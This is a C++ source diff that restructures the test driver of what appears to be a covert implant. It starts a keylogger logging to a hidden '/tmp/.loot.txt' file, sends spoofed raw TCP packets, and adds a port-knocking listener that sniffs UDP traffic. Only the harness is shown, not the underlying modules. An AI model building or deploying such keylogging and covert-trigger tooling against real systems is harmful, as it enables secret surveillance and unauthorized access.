@@ -6,42 +6,52 @@
 
 #include "NetworkEngine.h"
 #include "TcpStack.h"
+#include "UdpStack.h"
 #include "authenticator.h"
 #include "crypto.h"
 
 #include "Keylogger.h"
 
-int main(int argc, char *argv[]) {
-    const char *interfaceName = "wlp59s0";
-    const short sport = 42069;
-    const short dport = 7575;
+const char *interfaceName = "wlp59s0";
+
+const short sport = 42069;
+const short dport = 7575;
+
+UCharVector data({'a', 'b', 'c', 'd', 'e'});
+
+void testAuth() {
+    Authenticator auth;
+
+    std::cout << auth.generateSignature(sport) << std::endl;
+    std::cout << auth.generateSignature(dport) << std::endl;
+}
+
+void testCrypto() {
+    Crypto cryptoEngine("key");
+
+    UCharVector ciphertext = cryptoEngine.enc(data);
+    UCharVector plaintext = cryptoEngine.dec(ciphertext);
+}
+
+void testKeylogger() {
+    Keylogger kl("/tmp/.loot.txt");
+    kl.start_logging(); // should be started in another thread
+}
+
+void testNet() {
     struct in_addr srcAddr;
     struct in_addr dstAddr;
     srcAddr.s_addr = 0xDEADBEEF;
     dstAddr.s_addr = 0xEFBEADDE;
 
-    // Keylogger kl("/tmp/.loot.txt");
-    // kl.start_logging(); // should be started in another thread
-
-    UCharVector data({'a', 'b', 'c', 'd', 'e'});
-
-    Authenticator auth;
-    Crypto cryptoEngine("key");
     NetworkEngine netEngine(interfaceName);
-
-    std::cout << auth.generateSignature(sport) << std::endl;
-    std::cout << auth.generateSignature(dport) << std::endl;
-
-    // crypto examples
-    UCharVector ciphertext = cryptoEngine.enc(data);
-    UCharVector plaintext = cryptoEngine.dec(ciphertext);
 
     // tcp sending examples
     for (int i = 0; i < 10; i++) {
         std::cout << netEngine.sendRawTcp(srcAddr, dstAddr, sport, dport, TcpStack::SYN_FLAG, data)
                   << std::endl;
         std::cout << netEngine.sendRawTcp(srcAddr, dstAddr, sport, dport,
-                                       TcpStack::SYN_FLAG | TcpStack::ACK_FLAG, data)
+                                          TcpStack::SYN_FLAG | TcpStack::ACK_FLAG, data)
                   << std::endl;
     }
 
@@ -51,26 +61,56 @@ int main(int argc, char *argv[]) {
     }
 
     // adding functions to process payload received from pcap loop
-    auto cb1 = [](const pcap_pkthdr *header, const unsigned char *payload, NetworkEngine *) -> void {
-        std::cout << "cb1" << std::endl;
-    };
-    auto cb2 = [](const pcap_pkthdr *header, const unsigned char *payload, NetworkEngine *) -> void {
-        std::cout << "cb2" << std::endl;
-    };
-    auto cb3 = [](const pcap_pkthdr *header, const unsigned char *payload, NetworkEngine *) -> void {
-        std::cout << "cb3" << std::endl;
-    };
+    auto cb1 = [](const pcap_pkthdr *header, const unsigned char *payload,
+                  NetworkEngine *) -> void { std::cout << "cb1" << std::endl; };
+    auto cb2 = [](const pcap_pkthdr *header, const unsigned char *payload,
+                  NetworkEngine *) -> void { std::cout << "cb2" << std::endl; };
+    auto cb3 = [](const pcap_pkthdr *header, const unsigned char *payload,
+                  NetworkEngine *) -> void { std::cout << "cb3" << std::endl; };
     netEngine.LoopCallbacks.push_back(cb1);
     netEngine.LoopCallbacks.push_back(cb2);
     netEngine.LoopCallbacks.push_back(cb3);
 
     // example of starting and stopping sniffing
     std::cout << "starting sniff" << std::endl;
-    // TODO: Change the filter to only capture UDP packets for the port we're listening on?
     netEngine.startSniff(NetworkEngine::IP_FILTER);
     sleep(2);
     std::cout << "stopping sniff" << std::endl;
     netEngine.stopSniff();
+}
+
+void testKnock() {
+    NetworkEngine netEngine(interfaceName);
+    char *dottedDecimalString = inet_ntoa(*netEngine.getIp());
+    // std::string pcapFilter("ip and udp and dst host " + std::string(dottedDecimalString));
+    std::string pcapFilter("ip and udp");
+
+    auto knockTest = [](const pcap_pkthdr *header, const unsigned char *payload,
+                        NetworkEngine *netEngine) -> void {
+        struct ethhdr *eth = (struct ethhdr *)payload;
+        struct iphdr *ip = (struct iphdr *)(payload + ETH_HLEN);
+        struct udphdr *udp = (struct udphdr *)(payload + ETH_HLEN + (ip->ihl * 4));
+
+        unsigned short port = ntohs(udp->dest);
+        struct in_addr address;
+        address.s_addr = ntohl(ip->saddr);
+        netEngine->getKnockController()->process(&address, port);
+    };
+
+    netEngine.LoopCallbacks.push_back(knockTest);
+
+    netEngine.startSniff(pcapFilter.c_str());
+    sleep(20);
+    netEngine.stopSniff();
+}
+
+int main(int argc, char *argv[]) {
+
+    // testAuth();
+    // testCrypto();
+    // testKeylogger();
+    // testNet();
+    testKnock();
 
     return 0;
 }
